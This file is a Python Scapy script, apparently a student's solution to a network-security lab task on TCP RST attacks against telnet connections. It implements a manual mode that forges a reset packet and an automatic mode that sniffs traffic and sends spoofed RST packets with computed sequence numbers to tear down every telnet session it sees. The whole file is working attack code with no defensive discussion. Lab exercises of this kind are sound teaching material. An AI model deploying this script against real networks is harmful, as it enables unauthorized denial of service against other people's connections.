#!/usr/bin/env python3
from scapy.all import *

"""
    Task 2: TCP RST Attacks on telnet Connections
"""

import subprocess
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()

"""Manual mode. You have to set all the parameters"""
def manual_rst_attack(mysrc, mydst, mysport, mydport, myseq_number):
    print("Manual mode")
    ip = IP(src=mysrc, dst=mydst)
    tcp = TCP(sport=mysport, dport=mydport, flags="R", seq=myseq_number)
    pkt = ip/tcp

    send(pkt, iface=IFACE, verbose=0)


"""Automatic mode to automatically send RST packet to every telnet packet."""
def _rst_attack(pkt):
    print("Got a telnet packet, sending RST... ", end="")
    if pkt[TCP].sport == 23 or pkt[TCP].dport == 23:
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        if Raw in pkt:
            tcp_seg_len = len(pkt.getlayer(Raw).load)
        else:
            tcp_seg_len = 0
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
        pkt = ip/tcp
        send(pkt, iface=IFACE, verbose=0)
    print("done.")

"""Automatic mode to automatically send RST packet to every telnet packet."""
def automatic_rst_attack():
    print("Automatic Mode")
    print("Start sniffing...")
    sniff(iface=IFACE, filter="tcp", prn=_rst_attack)


if __name__ == "__main__":
    #myseq_number needs to be manually retrieved through wireshark by sniffing the traffic
    #manual_rst_attack("10.9.0.6", "10.9.0.7", port, 23, myseq_number)

    automatic_rst_attack()
